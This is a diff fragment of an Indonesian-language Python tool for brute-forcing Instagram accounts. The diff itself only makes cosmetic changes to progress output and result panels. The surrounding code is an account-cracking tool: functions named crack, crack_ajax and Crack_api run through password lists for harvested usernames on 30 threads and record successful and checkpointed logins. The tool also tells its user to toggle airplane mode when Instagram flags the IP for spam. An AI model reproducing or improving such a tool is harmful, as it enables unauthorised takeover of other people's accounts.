-	tabel3 = f"[bold white]ON\nON\nON"
+	tabel3 = f"[bold white]ON\nON\nON\nON"
 	colume_tabel = me()
 	colume_tabel.add_column("NO", style="bold green", justify='center')
 	colume_tabel.add_column("PILIHAN", style="bold green", justify='center', width=55)
@@ -465,11 +407,7 @@ def Metode():
 	else:Login_Dengan = "api.instagram.com"
 	SetCrack()
 
-xxkontol = []
 def SetCrack():
-	xxkontol.append(Panel(f"""{H2}Hasil OK DiSimpan Di{P2}: {P2}RESULTS-INSTAGRAM/{b}{Okc}""",width=39,style=f"bold blue"))
-	xxkontol.append(Panel(f"""{K2}Hasil CP DiSimpan Di{P2}: {P2}RESULTS-INSTAGRAM/{b}{Cpc}""",width=39,style=f"bold blue"))
-	console.print(Columns(xxkontol))
 	prints(Panel(f"{P2}Crack Di Mulai Tekan [bold green]'Ctrl+Z'{P2} Di Keyboard Anda Jika Ingin Berhenti\n\n        {P2}Hidupkan Mode Pesawat 5 Detik Jika Terdeteksi Spam IP",width=80,padding=(0,4),style=f"bold blue"))
 	with ThreadPoolExecutor (max_workers=30) as ASF:
 		for i in Uuid:
@@ -519,12 +457,9 @@ def Password(name):
 
 
 
-
-
 def Crack_api(username, memek):
 	global Ok, Cp, Loop
-	bo = random.choice([u])
-	sys.stdout(f" └──╭➣ Runing [ {Loop} ] {P2} Mendapatkan [ {H2}{str(len(Uuid))}{P2} ] {P2}Success [ {Ok} ] {P2} Failed [ {Cp} ]", end="\r")
+	print(f" └──╭➣ Runing [ {Loop} ] Mendapatkan [ {str(len(Uuid))} ] Success [ {Ok} ]  Failed [ {Cp} ]", end="\r")
 	sys.stdout.flush()
 	for password in memek:
 		try:
@@ -611,7 +546,7 @@ def Crack_api(username, memek):
 def Crack_i(username, memek):
 	global Ok, Cp, Loop
 	bo = random.choice([u])
-	sys.stdout(f" └──╭➣ Runing [ {Loop} ] {P2} Mendapatkan [ {H2}{str(len(Uuid))}{P2} ] {P2}Success [ {Ok} ] {P2} Failed [ {Cp} ]", end="\r")
+	print(f" └──╭➣ Runing [ {Loop} ] Mendapatkan [ {str(len(Uuid))} ] Success [ {Ok} ]  Failed [ {Cp} ]", end="\r")
 	sys.stdout.flush()
 	for password in memek:
 		try:
@@ -672,8 +607,7 @@ def x_mid(mid_list):
 
 def crack_ajax(username, memek):
 	global Ok, Cp, Loop
-	bo = random.choice([m, b, k, h, u])
-	sys.stdout(f" └──╭➣ Runing [ {Loop} ] {P2} Mendapatkan [ {H2}{str(len(Uuid))}{P2} ] {P2}Success [ {Ok} ] {P2} Failed [ {Cp} ]", end="\r")
+	print(f" └──╭➣ Runing [ {Loop} ] Mendapatkan [ {str(len(Uuid))} ] Success [ {Ok} ]  Failed [ {Cp} ]", end="\r")
 	sys.stdout.flush()    
 	for password in memek:
 		try:
@@ -763,8 +697,7 @@ def crack_ajax(username, memek):
 
 def crack(username, memek):
 	global Ok, Cp, Loop
-	bo = random.choice([m, b, k, h, u])
-	sys.stdout(f" └──╭➣ Runing [ {Loop} ] {P2} Mendapatkan [ {H2}{str(len(Uuid))}{P2} ] {P2}Success [ {Ok} ] {P2} Failed [ {Cp} ]", end="\r")
+	print(f" └──╭➣ Runing [ {Loop} ] Mendapatkan [ {str(len(Uuid))} ] Success [ {Ok} ]  Failed [ {Cp} ]", end="\r")
 	sys.stdout.flush()    
 	for password in memek:
 		try:
